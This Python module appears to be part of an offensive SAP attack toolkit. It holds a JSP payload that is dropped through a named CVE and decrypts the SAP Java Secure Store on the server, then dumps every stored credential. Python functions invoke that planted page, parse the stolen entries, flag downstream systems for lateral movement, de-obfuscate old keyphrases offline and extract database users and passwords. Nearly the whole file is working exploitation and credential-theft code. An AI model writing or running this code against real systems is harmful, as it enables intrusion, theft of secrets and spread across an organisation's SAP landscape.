#!/usr/bin/env python3
"""
SAP Java Secure Store extraction + decryption.

Uses the target's own `com.sap.security.core.server.secstorefs.SecStoreFS`
class via reflection to decrypt the store, so we don't have to track SAP's
ongoing algorithm changes (3DES → AES-128 → AES-256 by kernel version).
The JSP is dropped through the existing CVE-2025-31324 / GW SAPXPG path.

Names of well-known entries are pattern-matched against downstream ABAP
systems so SAPMAP can auto-populate credentials and draw RFC edges.
"""

from __future__ import annotations

import base64
import logging
import re
import ssl
import urllib.error
import urllib.parse
import urllib.request
from typing import Optional

logger = logging.getLogger(__name__)

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")

# ---------------------------------------------------------------------------
# JSP template: server-side decryption of SecStore.properties
# ---------------------------------------------------------------------------
#
# Usage: GET <jsp_url>?sid=<SID>[&props_path=...&key_path=...]
# Defaults to the canonical Windows path
#   C:\usr\sap\<SID>\SYS\global\security\data\SecStore.{properties,key}
#
# Response format (text/plain):
#   version=<SecStore.key version tag>
#   algorithm=<info string>
#   ### ENTRIES
#   <name>=<base64(utf-8 plaintext)>
#   ...
#   ### END
# On failure, emits
#   status=error
#   error=<class>: <message>
SECSTORE_JSP = r'''<%@ page contentType="text/plain" %>
<%
String sid       = request.getParameter("sid");
String propsPath = request.getParameter("props_path");
String keyPath   = request.getParameter("key_path");
String osSep     = System.getProperty("file.separator");
if (sid == null || sid.length() == 0) {
    out.println("status=error"); out.println("error=missing-sid"); return;
}
sid = sid.toUpperCase();

// Default paths: Unix first (file.separator "/"), Windows fallback.
if (propsPath == null) {
    if ("/".equals(osSep)) {
        propsPath = "/usr/sap/" + sid + "/SYS/global/security/data/SecStore.properties";
    } else {
        propsPath = "C:\\usr\\sap\\" + sid + "\\SYS\\global\\security\\data\\SecStore.properties";
    }
}
if (keyPath == null) {
    if ("/".equals(osSep)) {
        keyPath = "/usr/sap/" + sid + "/SYS/global/security/data/SecStore.key";
    } else {
        keyPath = "C:\\usr\\sap\\" + sid + "\\SYS\\global\\security\\data\\SecStore.key";
    }
}

try {
    Class<?> SSF = Class.forName("com.sap.security.core.server.secstorefs.SecStoreFS");
    // Static setup: filenames + SID (SID is needed for kernel < 7.00 but
    // setting it is harmless on newer kernels).
    SSF.getMethod("setDefaultFilenames", String.class, String.class)
       .invoke(null, propsPath, keyPath);
    try {
        SSF.getMethod("setSID", String.class).invoke(null, sid);
    } catch (NoSuchMethodException e) { /* older API */ }

    // Construct — SecStoreFS is non-public or has a private ctor in some
    // versions; use reflection to grab whichever is available.
    java.lang.reflect.Constructor<?> ctor = null;
    for (java.lang.reflect.Constructor<?> c : SSF.getDeclaredConstructors()) {
        if (c.getParameterTypes().length == 0) {
            ctor = c; ctor.setAccessible(true); break;
        }
    }
    if (ctor == null) {
        out.println("status=error");
        out.println("error=no-default-constructor");
        return;
    }
    Object inst = ctor.newInstance();

    // Tell the instance where its files live and open it (key is read from
    // the file; no dialog prompt needed on a properly-configured system).
    SSF.getMethod("setFilenames", String.class, String.class)
       .invoke(inst, propsPath, keyPath);
    SSF.getMethod("openExistingStore").invoke(inst);

    // Metadata for the caller: store version + available algorithms.
    try {
        Object ver = SSF.getMethod("getCurrentStoreVersion").invoke(inst);
        out.println("version=" + ver);
    } catch (Throwable t) { /* older API */ }
    try {
        Object info = SSF.getMethod("getDetailedStoreInfo").invoke(inst);
        out.println("algorithm=" + String.valueOf(info));
    } catch (Throwable t) { /* older API */ }

    // Dump decrypted key=value pairs.  getStringPairs() returns java.util.Properties.
    java.util.Properties pairs = (java.util.Properties)
        SSF.getMethod("getStringPairs").invoke(inst);
    out.println("### ENTRIES");
    for (String name : pairs.stringPropertyNames()) {
        String value = pairs.getProperty(name);
        byte[] vb = (value == null) ? new byte[0] : value.getBytes("UTF-8");
        String b64 = java.util.Base64.getEncoder().encodeToString(vb);
        out.println(name + "=" + b64);
    }
    out.println("### END");
} catch (Throwable t) {
    Throwable c = t;
    while (c.getCause() != null) c = c.getCause();
    out.println("status=error");
    out.println("error=" + c.getClass().getSimpleName() + ": " + c.getMessage());
    java.io.StringWriter sw = new java.io.StringWriter();
    c.printStackTrace(new java.io.PrintWriter(sw));
    out.println("trace=" + java.util.Base64.getEncoder()
        .encodeToString(sw.toString().getBytes("UTF-8")));
}
%>'''


# ---------------------------------------------------------------------------
# JSP invoker
# ---------------------------------------------------------------------------

def invoke_secstore_jsp(jsp_url: str, sid: str,
                         props_path: str = "", key_path: str = "",
                         timeout: float = 30.0) -> dict:
    """Call the deployed secure-store JSP and parse the response.

    Returns dict:
        success    : bool
        version    : store version byte (str if reported)
        algorithm  : summary info string
        entries    : list[{name, value}] of decrypted pairs
        error      : str (on failure)
        raw        : str (the full JSP body — useful for debugging)
    """
    params = {"sid": sid}
    if props_path:
        params["props_path"] = props_path
    if key_path:
        params["key_path"] = key_path
    url = f"{jsp_url}?{urllib.parse.urlencode(params)}"
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, headers={"User-Agent": _UA})

    result = {"success": False, "version": "", "algorithm": "",
              "entries": [], "error": "", "raw": ""}
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            text = r.read().decode("latin1", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            text = e.read().decode("latin1", errors="replace")
        except Exception:
            text = ""
        result["error"] = f"HTTP {e.code}"
        result["raw"] = text[:1000]
        return result
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        result["error"] = str(e)
        return result

    result["raw"] = text
    in_entries = False
    for line in text.splitlines():
        if line == "### ENTRIES":
            in_entries = True
            continue
        if line == "### END":
            in_entries = False
            result["success"] = True
            continue
        if not in_entries:
            if line.startswith("version="):
                result["version"] = line[len("version="):]
            elif line.startswith("algorithm="):
                result["algorithm"] = line[len("algorithm="):]
            elif line.startswith("status=error"):
                result["error"] = "server-side"
            elif line.startswith("error="):
                result["error"] = (result.get("error") + " / " if result["error"]
                                    else "") + line[len("error="):]
            continue
        if "=" not in line:
            continue
        name, b64val = line.split("=", 1)
        try:
            plain = base64.b64decode(b64val).decode("utf-8", errors="replace")
        except Exception:
            plain = ""
        result["entries"].append({"name": name, "value": plain})
    return result


# ---------------------------------------------------------------------------
# Downstream-target parsing
# ---------------------------------------------------------------------------

# SAP UME / NWAS convention names seen across kernels.  The patterns below
# map entry names to (kind, captured-target-SID, captured-client).  "kind"
# is a short tag used in the GUI / logs.
_DOWNSTREAM_PATTERNS = [
    # SAPJSF/<SID>/<client>  -- the classic "JCo technical user" entry
    (re.compile(r"^SAPJSF[/_](?P<sid>[A-Z0-9]{3})(?:[/_](?P<client>\d{3}))?$",
                re.IGNORECASE),
     "sapjsf"),
    # jco/<dest_name>/... or <sid>/jco/<dest>  -- named RFC destination
    (re.compile(r"^(?:jco[/_])?(?P<sid>[A-Z0-9]{3})[/_]jco[/_].*",
                re.IGNORECASE),
     "jco_dest"),
    # jdbc/pool/<SID>  -- database password on THIS node
    (re.compile(r"^jdbc[/_]pool[/_](?P<sid>[A-Z0-9]{3})$", re.IGNORECASE),
     "jdbc_local"),
    # sapj2ee/<SID>  -- local Java runtime admin
    (re.compile(r"^sapj2ee[/_](?P<sid>[A-Z0-9]{3})$", re.IGNORECASE),
     "sapj2ee_local"),
    # admin/<SID>  -- legacy
    (re.compile(r"^admin[/_](?P<sid>[A-Z0-9]{3})$", re.IGNORECASE),
     "admin_local"),
]


def classify_entry(name: str, source_sid: str) -> dict:
    """Classify a SecStore entry name.  Returns dict:
        kind       : "sapjsf"|"jdbc_local"|"jco_dest"|... or "unknown"
        target_sid : downstream SID if applicable, else ""
        client     : downstream ABAP client if applicable (3-digit), else ""
        is_local   : True if the credential targets this node itself
        is_downstream : True if it targets a DIFFERENT ABAP system
    """
    for rx, kind in _DOWNSTREAM_PATTERNS:
        m = rx.match(name)
        if not m:
            continue
        tgt = (m.groupdict().get("sid") or "").upper()
        client = m.groupdict().get("client") or ""
        is_local = bool(tgt) and tgt.upper() == source_sid.upper()
        is_downstream = bool(tgt) and not is_local and kind in ("sapjsf", "jco_dest")
        return {
            "kind": kind,
            "target_sid": tgt,
            "client": client,
            "is_local": is_local,
            "is_downstream": is_downstream,
        }
    return {"kind": "unknown", "target_sid": "", "client": "",
            "is_local": False, "is_downstream": False}


# ---------------------------------------------------------------------------
# Offline Python decryptor (ERPScan 3DES-era fallback)
# ---------------------------------------------------------------------------

# 20-byte XOR constant from ERPScan's SecStoreDec.  Only used when the key
# file's version marker indicates the 3DES-era algorithm.  Newer AES-era
# stores must be decrypted server-side via the JSP.
_XOR_CONSTANT = bytes([
    0x2b, 0xb6, 0x8f, 0xfa, 0x96, 0xec, 0xb6, 0x10,
    0x24, 0x47, 0x92, 0x65, 0x17, 0xb0, 0x09, 0xc4,
    0x3e, 0x0a, 0xd7, 0xbd,
])


def extract_keyphrase(key_bytes: bytes) -> tuple:
    """Parse SecStore.key, XOR-deobfuscate the keyphrase.

    Returns (version_string, keyphrase_bytes).  Raises ValueError for
    unparseable input.
    """
    text = key_bytes.decode("latin1", errors="replace")
    m = re.search(r"(\d\.\d{2}\.\d{3})\.\d{3}", text)
    version = m.group(1) if m else ""
    # ERPScan's tool uses a second group in the same regex for the obfuscated
    # keyphrase — in practice the bytes after the version marker form the
    # obfuscated payload.  This function is best-effort for 3DES-era stores.
    if m:
        tail = text[m.end():]
    else:
        tail = text
    # XOR the first len(_XOR_CONSTANT) bytes with the constant
    raw = tail.encode("latin1")[:len(_XOR_CONSTANT)]
    if len(raw) < len(_XOR_CONSTANT):
        raise ValueError(f"key tail too short ({len(raw)}B)")
    keyphrase = bytes(a ^ b for a, b in zip(raw, _XOR_CONSTANT))
    return version, keyphrase


# ---------------------------------------------------------------------------
# JDBC connection-string parser (extract user/password/host/db from decrypted
# jdbc/pool/<SID> entries).
# ---------------------------------------------------------------------------

_JDBC_DRIVER_TO_DB = {
    # Map SAP JDBC driver class names -> RFCDBSYS-style DB code
    "dbtech.jdbc.driversapdb": "ADA",
    "ngdbc.driver":            "HDB",
    "sqlserver.sqlserverdriver": "MSS",
    "jdbc.sqlserverdriver":    "MSS",
    "oracle.jdbc.oracledriver": "ORA",
    "ibm.db2.jcc.db2driver":   "DB6",
}


def parse_jdbc_entry(value: str) -> dict:
    """Decompose a SAP JDBC pool entry value into host/port/db/user/password.

    Handles the handful of URL layouts SAP emits (MaxDB, HANA, MSSQL,
    Oracle, DB2 — all variations differ only in delimiter quirks).
    Missing fields come back as empty strings.
    """
    out = {"driver": "", "db_type": "", "host": "", "port": "",
           "database": "", "user": "", "password": "", "raw_url": value}
    # Driver class name
    m = re.search(r"ClassName\s*=\s*([A-Za-z0-9_.]+)", value)
    if m:
        out["driver"] = m.group(1)
        low = m.group(1).lower()
        for key, code in _JDBC_DRIVER_TO_DB.items():
            if key in low:
                out["db_type"] = code
                break
    # User / Password (works for every SAP variant since SAP quotes ; and &)
    # Backslash-escape stripping (MaxDB emits \= and \& as literal chars).
    cleaned = value.replace("\\", "")
    m = re.search(r"[?&;]User\s*=\s*([^&;]+)", cleaned, re.IGNORECASE)
    if m: out["user"] = m.group(1).strip()
    m = re.search(r"[?&;]Password\s*=\s*([^&;]*)", cleaned, re.IGNORECASE)
    if m: out["password"] = m.group(1).strip()
    # Host / port / database from the inner JDBC URL
    m = re.search(r"Url\s*=\s*jdbc:([^?]+)", cleaned, re.IGNORECASE)
    inner = m.group(1) if m else ""
    if not inner:
        # Some entries put the inner URL right at the top level
        m = re.search(r"jdbc:([^?&;\s]+)", cleaned, re.IGNORECASE)
        inner = m.group(1) if m else ""
    m = re.match(r"([a-z]+)://([^/:]+)(?::(\d+))?(?:/([^?&;\s]+))?", inner,
                  re.IGNORECASE)
    if m:
        out["host"] = m.group(2) or ""
        out["port"] = m.group(3) or ""
        out["database"] = m.group(4) or ""
    return out
